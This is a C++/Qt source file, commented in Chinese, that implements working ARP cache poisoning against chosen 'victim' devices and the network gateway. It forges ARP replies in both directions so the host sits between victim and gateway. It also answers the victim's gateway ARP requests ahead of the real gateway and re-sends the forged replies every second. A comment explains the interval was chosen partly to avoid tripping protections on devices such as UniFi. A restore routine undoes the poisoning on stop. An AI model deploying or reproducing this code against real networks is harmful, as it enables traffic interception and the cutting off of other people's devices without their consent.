#include "ArpSpoofer.h"

#include "IL2Endpoint.h"

#include <QDebug>
#include <QHostAddress>
#include <QTimer>

#include <cstring>

// 重发周期：主力是 answerGatewayArp 的「一问就抢答」，周期重发只作兜底（设备缓存未过期、
// 不主动 ARP 的间隙里，抵消真网关可能发来的 gratuitous ARP）。1s 比原来的 1.5s 更压得住，
// 又不至于像几百毫秒那样像 ARP 风暴、招 UniFi 这类设备的防护。
static constexpr int kSpoofIntervalMs = 1000;
// heal 连发遍数：多发几遍抵消可能滞留的欺骗缓存，确保设备恢复联网。
static constexpr int kHealRepeat = 3;

ArpSpoofer::ArpSpoofer(IL2Endpoint *endpoint, QObject *parent)
    : QObject(parent), m_endpoint(endpoint), m_timer(new QTimer(this))
{
    m_timer->setInterval(kSpoofIntervalMs);
    connect(m_timer, &QTimer::timeout, this, &ArpSpoofer::tick);
}

ArpSpoofer::~ArpSpoofer()
{
    // 兜底：无论如何退出，都把被劫持设备的 ARP 还原，避免留人断网。
    healAll();
}

bool ArpSpoofer::configured() const
{
    return m_localMac.size() == 6 && m_gatewayIp.size() == 4 && m_gatewayMac.size() == 6;
}

void ArpSpoofer::configure(const QString &localMac, const QString &gatewayIp, const QString &gatewayMac)
{
    m_localMac = macToBytes(localMac);
    m_gatewayIp = ipToBytes(gatewayIp);
    m_gatewayMac = macToBytes(gatewayMac);
    if (!configured())
        qWarning() << "ArpSpoofer: 配置无效，欺骗将 no-op" << localMac << gatewayIp << gatewayMac;
}

void ArpSpoofer::startSpoof(const QString &victimMac, const QString &victimIp)
{
    if (!configured()) {
        qWarning() << "ArpSpoofer: 未配置，忽略 startSpoof" << victimMac;
        return;
    }
    const QByteArray vmac = macToBytes(victimMac);
    const QByteArray vip = ipToBytes(victimIp);
    if (vmac.size() != 6 || vip.size() != 4) {
        qWarning() << "ArpSpoofer: victim 地址非法，忽略" << victimMac << victimIp;
        return;
    }

    const Target t{vmac, vip};
    m_victims.insert(victimMac.toLower(), t);
    sendSpoof(t); // 立刻抢占一次，别等下个 tick
    if (!m_timer->isActive())
        m_timer->start();
}

void ArpSpoofer::stopSpoof(const QString &victimMac)
{
    const auto it = m_victims.find(victimMac.toLower());
    if (it == m_victims.end())
        return;
    if (configured())
        healOne(it->mac, it->ip); // 先还原再移除
    m_victims.erase(it);
    if (m_victims.isEmpty() && m_timer->isActive())
        m_timer->stop();
}

bool ArpSpoofer::answerGatewayArp(const QByteArray &frame)
{
    if (!m_endpoint || !configured())
        return false;
    // 完整以太 + ARP 至少 42 字节：14 以太头 + 28 ARP 载荷。
    if (frame.size() < 42)
        return false;
    const uchar *f = reinterpret_cast<const uchar *>(frame.constData());
    // ethertype 必须是 ARP(0x0806)、op 必须是 request(1)。htype/ptype/hlen/plen 按以太+IPv4 校验，
    // 免得把别的 ARP 变种误当请求。
    if (f[12] != 0x08 || f[13] != 0x06)
        return false;
    if (f[14] != 0x00 || f[15] != 0x01 || f[16] != 0x08 || f[17] != 0x00 || f[18] != 6 || f[19] != 4)
        return false;
    if (f[20] != 0x00 || f[21] != 0x01) // op=1 request
        return false;

    // ARP 载荷：sha=f[22..27], spa=f[28..31], tpa=f[38..41]。
    // 只对「问的正是我们冒充的那个网关 IP」抢答。
    if (std::memcmp(f + 38, m_gatewayIp.constData(), 4) != 0)
        return false;

    const QByteArray senderMac(reinterpret_cast<const char *>(f + 22), 6); // 设备 MAC
    const QByteArray senderIp(reinterpret_cast<const char *>(f + 28), 4);  // 设备 IP
    // 回一帧欺骗 reply 给设备：sha=本机MAC, spa=网关IP → 「网关在本机」。目的就是发起请求的设备。
    const QByteArray reply =
            buildArpReply(senderMac, m_localMac, m_localMac, m_gatewayIp, senderMac, senderIp);
    m_endpoint->send(reply);
    return true;
}

void ArpSpoofer::healAll()
{
    if (configured()) {
        for (auto it = m_victims.constBegin(); it != m_victims.constEnd(); ++it)
            healOne(it->mac, it->ip);
    }
    m_victims.clear();
    if (m_timer && m_timer->isActive())
        m_timer->stop();
}

QStringList ArpSpoofer::victims() const
{
    return m_victims.keys();
}

void ArpSpoofer::tick()
{
    if (!configured())
        return;
    for (auto it = m_victims.constBegin(); it != m_victims.constEnd(); ++it)
        sendSpoof(it.value());
}

void ArpSpoofer::sendSpoof(const Target &t)
{
    if (!m_endpoint || !configured())
        return;

    // (a) 发给 victim：sha=本机MAC，spa=网关IP → “网关 IP 在本机”，victim 出网走我们。
    const QByteArray toVictim =
        buildArpReply(t.mac, m_localMac, m_localMac, m_gatewayIp, t.mac, t.ip);
    // (b) 发给网关：sha=本机MAC，spa=victimIP → “victim IP 在本机”，回程走我们。
    const QByteArray toGateway =
        buildArpReply(m_gatewayMac, m_localMac, m_localMac, t.ip, m_gatewayMac, m_gatewayIp);

    m_endpoint->send(toVictim);
    m_endpoint->send(toGateway);
}

void ArpSpoofer::healOne(const QByteArray &victimMac, const QByteArray &victimIp)
{
    if (!m_endpoint)
        return;

    // 给 victim：网关 IP 在真实网关 MAC（还原它的默认网关映射）。
    const QByteArray toVictim =
        buildArpReply(victimMac, m_gatewayMac, m_gatewayMac, m_gatewayIp, victimMac, victimIp);
    // 给网关：victim IP 在真实 victim MAC（还原网关侧映射）。
    const QByteArray toGateway =
        buildArpReply(m_gatewayMac, victimMac, victimMac, victimIp, m_gatewayMac, m_gatewayIp);

    for (int i = 0; i < kHealRepeat; ++i) {
        m_endpoint->send(toVictim);
        m_endpoint->send(toGateway);
    }
}

QByteArray ArpSpoofer::macToBytes(const QString &mac)
{
    const QStringList parts = mac.split(QLatin1Char(':'));
    if (parts.size() != 6)
        return {};
    QByteArray out(6, char(0));
    for (int i = 0; i < 6; ++i) {
        bool ok = false;
        const uint v = parts.at(i).toUInt(&ok, 16);
        if (!ok || v > 0xFFu)
            return {};
        out[i] = static_cast<char>(v);
    }
    return out;
}

QByteArray ArpSpoofer::ipToBytes(const QString &ip)
{
    const QHostAddress addr(ip);
    bool ok = false;
    const quint32 v = addr.toIPv4Address(&ok); // 网络序无关：下面手动按大端拆字节
    if (!ok)
        return {};
    QByteArray out(4, char(0));
    out[0] = static_cast<char>((v >> 24) & 0xFFu);
    out[1] = static_cast<char>((v >> 16) & 0xFFu);
    out[2] = static_cast<char>((v >> 8) & 0xFFu);
    out[3] = static_cast<char>(v & 0xFFu);
    return out;
}

QByteArray ArpSpoofer::buildArpReply(const QByteArray &ethDst, const QByteArray &ethSrc,
                                     const QByteArray &senderMac, const QByteArray &senderIp,
                                     const QByteArray &targetMac, const QByteArray &targetIp)
{
    // 完整以太帧：14 字节以太头 + 28 字节 ARP 载荷 = 42 字节。
    QByteArray f;
    f.reserve(42);
    f.append(ethDst);            // 目的 MAC (6)
    f.append(ethSrc);            // 源 MAC   (6)
    f.append(char(0x08));        // ethertype = 0x0806 (ARP)
    f.append(char(0x06));
    f.append(char(0x00));        // htype = 0x0001 (Ethernet)
    f.append(char(0x01));
    f.append(char(0x08));        // ptype = 0x0800 (IPv4)
    f.append(char(0x00));
    f.append(char(0x06));        // hlen = 6
    f.append(char(0x04));        // plen = 4
    f.append(char(0x00));        // op = 0x0002 (reply)
    f.append(char(0x02));
    f.append(senderMac);         // sha (6)
    f.append(senderIp);          // spa (4)
    f.append(targetMac);         // tha (6)
    f.append(targetIp);          // tpa (4)
    return f;
}
